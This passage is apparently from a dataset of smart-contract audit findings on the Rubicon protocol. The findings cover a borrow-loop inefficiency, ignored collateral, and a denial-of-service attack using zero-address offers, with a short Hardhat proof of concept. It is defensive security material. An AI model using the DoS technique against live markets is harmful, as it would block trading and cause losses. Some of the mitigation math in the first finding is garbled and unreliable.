_max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n```\n\nThe important thing to note here is that on the first iteration `_loopBorrowed` is the result of `wmul(_assetAmount, _collateralFactor`, but going forward it is a result of itself, e.g. `wmul(_loopBorrowed, _collateralFactor)`\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.7e18) = 17.5e18\n\t- `_assetAmount` = 25e18 + 17.5e18 = 42.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(17.5e18, 0.7e18) = 12.25e18\n    -   `_assetAmount` = 42.5e18 + 12.25e18 = 54.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.25e18, 0.7e18) = 8.575e18\n    -   `_assetAmount` = 54.75e18 + 8.575e18 = 63.325e18\n\nSo, it takes 3 iterations to reach the required result. However, the vulnerability here though is hiding in plain sight.\n\nGiven that `_loopBorrowed` is \"dividing from itself\", what would happen if it goes to 1, or even 0, but the desired amount is big enough.\n\nBut.. how could that happen? What if the `collateralFactor` is 0.5e18 instead of 0.7e18?\n\n```typescript\n\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.5\", 18)\n    );\n```\n\nLet's do the exercise again with a reduced collateral factor.\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.5e18) = 12.5e18\n\t- `_assetAmount` = 25e18 + 12.5e18 = 37.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.5e18, 0.5e18) = 6.25e18\n    -   `_assetAmount` = 37.5e18 + 6.25e18 = 43.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(6.25e18, 0.5e18) = 3.125e18\n    -   `_assetAmount` = 43.75e18 + 3.125e18 = 46,875e18\n* On the fourth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(3.125e18, 0.5e18) = 1.5625e18\n    -   `_assetAmount` = 43.75e18 + 1.5625e18 = 48.4375e18\n* On the fifth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(1.5625e18, 0.5e18) = 0.78125e18\n    -   `_assetAmount` = 43.75e18 + 6.2e18 = 49,2187e18\n\nNow that `_loopBorrowed` < 0 I think its pretty clear where this is going. It will take approximately 60 more iterations until `wmul(_loopBorrowed, 0.5e18)` returns `1`.\n\nAt this point `_assetAmount` will be around `50000000000000000020`, which means it will take the `8299999999999999980` more iterations to get to the required desired amount.\n\nYou can verify these results by running the `yarn hardhat test ./test/leverage-wrapper.ts --grep \"should open long position\"` command from the existing test suite, which will produce the following output:\n\n\nI have added some console logs for you if you want a visual representation.\n\n```solidity\n  function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n        console.log(_desiredAmount, \"desiredAmount\");\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n        // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            console.log(\"****** in loop\");\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n                    console.log(\"max\", _max);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n\n\n            console.log(\"_loopBorrowed\", _loopBorrowed);\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n            console.log(\"_assetAmount\", _assetAmount);\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n\n            console.log(\"limit\", _limit);\n        }\n    }\n```\n\nIn conclusion, when the collateral factor is lower (and the leverage high), the `_borrowLimit` function becomes highly inefficient and requires a large number of iterations to calculate the desired amount.\n\nThis is just one nuance of this vulnerability and it could be triggered in various ways, but I hope this single explanation is good enough to convince you that it should be addressed.\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nThat's probably one of my hardest mitigations steps to write, so I'll brain-dump almost everything I've researched and that comes to my mind.\n\n**Limit the number of iterations**:\n\nIntroduce a maximum number of iterations that the while loop can run, preventing the function from running indefinitely.\n\nThis approach helps prevent the infinite loop issue, but it means your system won't be able to work with specific collateral factors.\n\nInstead, the maximum number of iterations can be chosen based on expected usage patterns and system requirements.\n\n```solidity\nuint256 maxIterations = 50;\nuint256 currentIteration = 0;\n\nwhile (_assetAmount <= _desiredAmount && currentIteration < maxIterations) {\n    // existing logic\n    currentIteration++;\n}\n\n```\n\n\n**Restrict the minimum `_loopBorrowed` value**:\n\nDefine a minimum acceptable value for `_loopBorrowed` and halt the loop if the value goes below this threshold.\n\nThis approach can help prevent the `_loopBorrowed` value from becoming too small and causing an infinite loop. However, it has the same drawbacks as the previous solution.\n\n\n```solidity\nuint256 minLoopBorrowed = 1e9; // Choose an appropriate minimum value based on the token decimals\n\nwhile (_assetAmount <= _desiredAmount) {\n    // existing logic\n\n    if (_loopBorrowed < minLoopBorrowed) {\n        break;\n    }\n}\n```\n\n\n**Use a more sophisticated algorithm**:\nInstead of a while loop, consider using a more sophisticated algorithm to calculate the borrowing limit and last borrow amount.\n\nIt might be possible to derive a closed-form solution that directly calculates the borrowing limit without needing a loop.\n\nHowever, this approach requires a deep understanding of the mathematical relationship between the input parameters and the desired borrowing limit.\n\nFor instance, if the borrowing limit calculation follows a simple linear relationship, the closed-form solution could be derived as follows:\n\n```solidity\nfunction borrowLimit(uint256 _desiredAmount, uint256 _collateral, uint256 _loanFactor) public view returns (uint256) {\n    // Calculate the borrowing limit using the closed-form solution\n    uint256 borrowLimit = (_desiredAmount * _loanFactor) / (_collateral - _desiredAmount);\n\n    return borrowLimit;\n}\n\n```\n\nTo apply the closed-form solution to the `_borrowLimit` function, we would need to adjust the smart contract to directly compute the required number of iterations `n` and the final borrowed amount.\n\nInstead, we can use the closed-form solution formula to calculate `n` and then determine the final borrowed amount using the formula for the sum of a geometric series.\n\nFor example, consider the scenario where the initial asset amount is `A0 = 10,000` tokens, the desired asset amount is `Ad = 15,000` tokens (10,000 tokens + 5,000 tokens), and the collateral factor is `c = 0.5`. Using the closed-form solution formula:\n\n`n = log_c((1 - ((Ad * (1 - c)) / A0)) - 1)`\n\nSubstituting the values: `n = log_0.5((1 - ((15,000 * (1 - 0.5)) / 10,000)) - 1)`\n\nAfter calculating, we get: `n â‰ˆ 1.58`\n\nSince `n` should be an integer (as it represents the number of iterations), we round up to the nearest whole number: `n = 2`\n\nWe can now calculate the final borrowed amount using the formula for the sum of a geometric series:\n\n`Ad = A0 + A0 * c + A0 * c^2 + ... + A0 * c^n`\n\nSubstituting the values: `15,000 = 10,000 + 10,000 * 0.5 + 10,000 * 0.5^2`\n\nCalculating the geometric series: `15,000 = 10,000 + 5,000 + 2,500`\n\nThus, the final borrowed amount is: `5,000 = 5,000 + 2,500`\n\nNow that we know how it *could*  work, we would need to identify the geometric series that represents the problem and use the closed-form formula for a geometric series to calculate the borrow limit.\n\nIf the collateral factor is not equal to 1, we would need to calculate the number of terms using the closed-form formula for a geometric series and the last borrow amount using the geometric series formula.\n\nThe pseudocode for the updated `_borrowLimit` function using the closed-form solution looks like this:\n\n```solidity\nfunction _borrowLimit(\n    address _bathToken,\n    address _asset,\n    uint256 _assetAmount,\n    uint256 _leverage\n) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n    (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n    uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n    uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n    if (_minted != 0) {\n        uint256 _max = _maxBorrow(_bathToken);\n        _assetAmount = wmul(_assetAmount, _collateralFactor).add(_max);\n    }\n\n    if (_collateralFactor == WAD) {\n        // Collateral factor is 1, which means it's a 1x short or perfect matching\n        _limit = (_desiredAmount.sub(_assetAmount)).div(WAD);\n        _lastBorrow = wmul(_assetAmount, _collateralFactor);\n    } else {\n        // Calculate the number of terms using the closed-form formula for a geometric series\n        _limit = uint256(\n            log1p(\n                wdiv(\n                    (_desiredAmount.mul(WAD.sub(_collateralFactor))).sub(_assetAmount.mul(WAD)),\n                    _assetAmount.mul(_collateralFactor)\n                )\n            ).div(log1p(_collateralFactor.sub(WAD)))\n        );\n\n        // Calculate the last borrow amount\n        _lastBorrow = wmul(_assetAmount, pow(_collateralFactor, _limit)).sub(_assetAmount);\n    }\n}\n\n```\n\nPlease note that the provided solution is incomplete and requires additional adjustments.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 604,
      "page_start": null,
      "heading": "604. Position._borrowLimit doesn't use exisiting collateral in case if user doesn't have any `_bathToken`",
      "heading_cleaned": "Position._borrowLimit doesn't use exisiting collateral in case if user doesn't have any `_bathToken`",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n\n\n# Vulnerability details\n\n## Impact\nPosition._borrowLimit doesn't use exisiting collateral in case if user doesn't have any `_bathToken`.\n\n## Proof of Concept\n`Position._borrowLimit` function is used to calculate how many times user needs to make borrow loop and how many percent of maximum allowed amount to borrow.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n```solidity\n    function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n        }\n    }\n```\nInside `while` loop there is one interesting thing: `if (_minted != 0)`.\nIn case if this `true`, that means that user currently has some amount of `_bathToken`, which means that he already has some collateral that can be used to borrow on it. Then `_maxBorrow(_bathToken)` function is called in order to know how many collateral user has and what is the max amount he can borrow using that collateral.\n\nBut in case if this if(`if (_minted != 0)`) is not true it means that user currently doesn't have any `_bathToken`, then `_maxBorrow(_bathToken)` will not be called. However user still can have collateral in other than `_bathToken` token.\nIn this case that collateral also should be used to borrow on it, but it's ignored.\n\nScenario.\n1.User opened position using bathUSDC and he currently has some amount as collateral inside bathUSDC.\n2.Then he open positions using bathETH and in this case his bathUSDC collateral is not used.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nYou should check if user has liquidity\n`(uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller.getAccountLiquidity(address(this));`\nIn case if `_liq` is not 0, then you should call `_maxBorrow(_bathToken)` and use that collateral.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n\n\n# Vulnerability details\n\n## Impact\nPosition._borrowLimit doesn't use exisiting collateral in case if user doesn't have any `_bathToken`.\n\n## Proof of Concept\n`Position._borrowLimit` function is used to calculate how many times user needs to make borrow loop and how many percent of maximum allowed amount to borrow.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n```solidity\n    function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n        }\n    }\n```\nInside `while` loop there is one interesting thing: `if (_minted != 0)`.\nIn case if this `true`, that means that user currently has some amount of `_bathToken`, which means that he already has some collateral that can be used to borrow on it. Then `_maxBorrow(_bathToken)` function is called in order to know how many collateral user has and what is the max amount he can borrow using that collateral. \n\nBut in case if this if(`if (_minted != 0)`) is not true it means that user currently doesn't have any `_bathToken`, then `_maxBorrow(_bathToken)` will not be called. However user still can have collateral in other than `_bathToken` token.\nIn this case that collateral also should be used to borrow on it, but it's ignored.\n\nScenario.\n1.User opened position using bathUSDC and he currently has some amount as collateral inside bathUSDC.\n2.Then he open positions using bathETH and in this case his bathUSDC collateral is not used.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nYou should check if user has liquidity\n`(uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller.getAccountLiquidity(address(this));`\nIn case if `_liq` is not 0, then you should call `_maxBorrow(_bathToken)` and use that collateral.",
      "description": null,
      "impact": "## Impact\nPosition._borrowLimit doesn't use exisiting collateral in case if user doesn't have any `_bathToken`.\n",
      "mitigation": "## Recommended Mitigation Steps\nYou should check if user has liquidity\n`(uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller.getAccountLiquidity(address(this));`\nIn case if `_liq` is not 0, then you should call `_maxBorrow(_bathToken)` and use that collateral.\n",
      "poc": "## Proof of Concept\n`Position._borrowLimit` function is used to calculate how many times user needs to make borrow loop and how many percent of maximum allowed amount to borrow.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n```solidity\n    function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n        }\n    }\n```\nInside `while` loop there is one interesting thing: `if (_minted != 0)`.\nIn case if this `true`, that means that user currently has some amount of `_bathToken`, which means that he already has some collateral that can be used to borrow on it. Then `_maxBorrow(_bathToken)` function is called in order to know how many collateral user has and what is the max amount he can borrow using that collateral.\n\nBut in case if this if(`if (_minted != 0)`) is not true it means that user currently doesn't have any `_bathToken`, then `_maxBorrow(_bathToken)` will not be called. However user still can have collateral in other than `_bathToken` token.\nIn this case that collateral also should be used to borrow on it, but it's ignored.\n\nScenario.\n1.User opened position using bathUSDC and he currently has some amount as collateral inside bathUSDC.\n2.Then he open positions using bathETH and in this case his bathUSDC collateral is not used.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVsCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nPosition._borrowLimit doesn't use exisiting collateral in case if user doesn't have any `_bathToken`.\n",
        "recommendation": "## Recommended Mitigation Steps\nYou should check if user has liquidity\n`(uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller.getAccountLiquidity(address(this));`\nIn case if `_liq` is not 0, then you should call `_maxBorrow(_bathToken)` and use that collateral.\n",
        "poc": "## Proof of Concept\n`Position._borrowLimit` function is used to calculate how many times user needs to make borrow loop and how many percent of maximum allowed amount to borrow.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n```solidity\n    function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n        }\n    }\n```\nInside `while` loop there is one interesting thing: `if (_minted != 0)`.\nIn case if this `true`, that means that user currently has some amount of `_bathToken`, which means that he already has some collateral that can be used to borrow on it. Then `_maxBorrow(_bathToken)` function is called in order to know how many collateral user has and what is the max amount he can borrow using that collateral.\n\nBut in case if this if(`if (_minted != 0)`) is not true it means that user currently doesn't have any `_bathToken`, then `_maxBorrow(_bathToken)` will not be called. However user still can have collateral in other than `_bathToken` token.\nIn this case that collateral also should be used to borrow on it, but it's ignored.\n\nScenario.\n1.User opened position using bathUSDC and he currently has some amount as collateral inside bathUSDC.\n2.Then he open positions using bathETH and in this case his bathUSDC collateral is not used.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVsCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n\n\n# Vulnerability details\n\n## Impact\nPosition._borrowLimit doesn't use exisiting collateral in case if user doesn't have any `_bathToken`.\n\n## Proof of Concept\n`Position._borrowLimit` function is used to calculate how many times user needs to make borrow loop and how many percent of maximum allowed amount to borrow.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583\n```solidity\n    function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n        }\n    }\n```\nInside `while` loop there is one interesting thing: `if (_minted != 0)`.\nIn case if this `true`, that means that user currently has some amount of `_bathToken`, which means that he already has some collateral that can be used to borrow on it. Then `_maxBorrow(_bathToken)` function is called in order to know how many collateral user has and what is the max amount he can borrow using that collateral.\n\nBut in case if this if(`if (_minted != 0)`) is not true it means that user currently doesn't have any `_bathToken`, then `_maxBorrow(_bathToken)` will not be called. However user still can have collateral in other than `_bathToken` token.\nIn this case that collateral also should be used to borrow on it, but it's ignored.\n\nScenario.\n1.User opened position using bathUSDC and he currently has some amount as collateral inside bathUSDC.\n2.Then he open positions using bathETH and in this case his bathUSDC collateral is not used.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nYou should check if user has liquidity\n`(uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller.getAccountLiquidity(address(this));`\nIn case if `_liq` is not 0, then you should call `_maxBorrow(_bathToken)` and use that collateral.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 644,
      "page_start": null,
      "heading": "644. DOS of market operations with malicious offers",
      "heading_cleaned": "DOS of market operations with malicious offers",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1079\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1039\n\n\n# Vulnerability details\n\n## Impact\nThe Rubicon market has two functions that are interesting: `buyAllAmount` and `sellAllAmount`. These functions are responsible for using up offers until the entire amount is bought or sold. The contract stores offers in a sorted linked list, each with its unique id, and sorted according to the price. This ensures that the head of the linked list has the best price, or the best offer for either sell or buy. This head is referenced in the code by the mapping `_best[address][address]` and further worse offers can be navigated to by calling best.next, similar to a linked list navigation.\n\nWhen `buyAllAmount` is called, a while loop is run, and the best offer is taken out in each iteration using the function `getBestOffer()` similar to the snippet below.\n```solidity\nwhile (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n```\nThe offers are then filled one after the other. However, if an offer is unfillable, or reverts, then the whole transaction reverts. This breaks the functionality of the `buyAllAmount` function and creates a DOS attack vector.\n\nThe standard openzeppelin implementation of the ERC20 token does not support transfers to the zero address. If a transaction tries to send tokens to 0 address, it reverts with 'ERC20: transfer to the zero address'. Thus if an offer is created where the receiver of the payment is zero address, that offer can be unfillable. If this offer is created such that it is the best possible price, then this offer will exist at the head of the linked list in the `_best` variable and thus will be the first offer looked into. Since this offer is unfillable, the entire transaction will revert.\n\nWhen creating an offer, the user can specify two addresses, the owner address and the recipient address. The contract does not sanitize these addresses and even accepts 0 address in these fields. These are also the addresses where the payment token is sent when the order is filled.\n\nThus, a malicious user can create a buy/sell order of a small volume but at a very good price. They can set both the owner and the recipient to 0 when calling `offer()`. This will create a lucrative unfillable order which will always be called on first. This will lead to all transactions reverting due to this single unfillable offer.\n\nThe impact is even more pronounced for the `Position.sol` contract. Unlike normal users, this contract does not have the ability to select offers by id, and is only filled using `buyAllAmount` or `sellAllAmount`. A DOS attack as described above will break the functionality of the two mentioned functions, and thus break the whole Position contract as a result. This can lead to large losses where users are unable to unwind positions before liquidations.\n\nThis also has a secondary impact of blocking the creation of future orders. As can be seen [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1273-L1341), in the `_matcho` function, when new offers are created, they are first matched with existing offers in the same range, and if there is still a balance remaining, a new offer is created. Now if the existing offers are such unfillable orders, it would also block the creation of further new orders, causing another functionality DOS.\n\n## Proof of Concept\nThe POC shows that if the recipient and owner addresses are both set to 0, the order cannot be filed. This order will exist in the linked list sorted by price and thus will be the first order to be filled.\n\nFirst, change the code in `deployRubiconProtocolFixture()` where the orders are created [here](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/ProtocolDeployment.ts#L165-L171) to the following order:\n```javascript\nawait rubiconMarket.functions[\n            \"offer(uint256,address,uint256,address,address,address)\"\n        ](\n            parseUnits(\"100\"),\n            testCoin.address,\n            parseUnits(\"110\", 6),\n            testStableCoin.address,\n            ethers.constants.AddressZero,\n            ethers.constants.AddressZero,\n            { from: owner.address }\n        )\n```\n\nThis creates an unfillable order. Now try running the provided test in \"can take an offer with 0 makerFee\" by using the command `hardhat test --grep \"0 makerFee\"`.\n\nThis test fails with 'ERC20: transfer to the zero address' error, since the order is unfillable. The test body is also copied here as reference.\n```javascript\nit(\"can take an offer with 0 makerFee\", async function () {\n                const { rubiconMarket, testCoin, owner } = await loadFixture(\n                    deployRubiconProtocolFixture\n                )\n                const balanceBefore = await testCoin.balanceOf(owner.address)\n                // in TEST\n                const quantity = 